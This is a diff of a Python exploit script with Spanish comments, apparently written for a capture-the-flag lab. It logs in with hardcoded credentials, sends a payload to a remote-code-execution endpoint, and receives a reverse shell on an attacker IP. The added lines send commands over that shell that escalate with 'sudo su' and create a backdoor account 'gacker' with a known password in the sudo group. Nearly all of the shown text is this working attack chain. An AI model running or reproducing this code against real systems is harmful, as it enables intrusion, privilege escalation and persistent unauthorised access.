@@ -9,7 +9,7 @@ import threading # Necesaria para ejecutar procesos simultaneamente
 sesion = re.Session()
 
 # Defino las constantes del PoC de requests + session
-LOGIN_ENDPOINT = 'http://10.129.188.97/login.php'
+LOGIN_ENDPOINT = 'http://10.128.151.11/login.php'
 CREDENCIALES = {
     'username' : 'R1ckRul3s',
     'password' : 'Wubbalubbadubdub',
@@ -17,7 +17,7 @@ CREDENCIALES = {
 }
 
 # Defino el ednpoint donde se va a mandar el payload
-RCE_ENDPOINT = 'http://10.129.188.97/portal.php'
+RCE_ENDPOINT = 'http://10.128.151.11/portal.php'
 
 # Defino las constantes de IP y Puerto para la ejecucion de la llamada y poder recibirla posteriormente
 IP_HOST = '192.168.132.194'
@@ -51,7 +51,12 @@ def listener(puerto):
     print(f'Conexión recibida de {direccion[0]}!')
     # Mandamos automaticamente el siguiente comando con .send
     conexion.send(b"sudo su\n") # Escalamos con sudo su ya que cualquier usuario puede elevarse sin passwd
-    conexion.send(b"whoami\n") # Comprobamos que ahora somos usuaios administradores
+    conexion.send(b"useradd -m -s /bin/bash gacker\n") # Creo un usuario con home y shell
+    conexion.send(b"echo 'gacker:gacker' | chpasswd\n") # Se le asigna una contrasena al usuario
+    conexion.send(b"usermod -aG sudo gacker\n") # Anadimos el usuario gacker al grupo sudo
+    conexion.send(b"sudo su gacker\n") # Iniciamos sesion como usuario gacker
+    conexion.send(b"whoami\n") # Comprobamos que se halla iniciado correctamente y que somos dicho usuario
+    conexion.send(b"echo 'gacker' | sudo -S whoami\n") # Usamos el comando sudo whoami para verificar que tenemos permisos de administrador
     time.sleep(1) # Despues del comando anadimos un sleep para asegurarnos de que lo procese
     # Ahora con .recv y decode almacenamos la respuesta del server y la imprimimos por pantalla
     respuesta_server = conexion.recv(4096).decode() # Aumentamos la cantidad de datos a recolectar
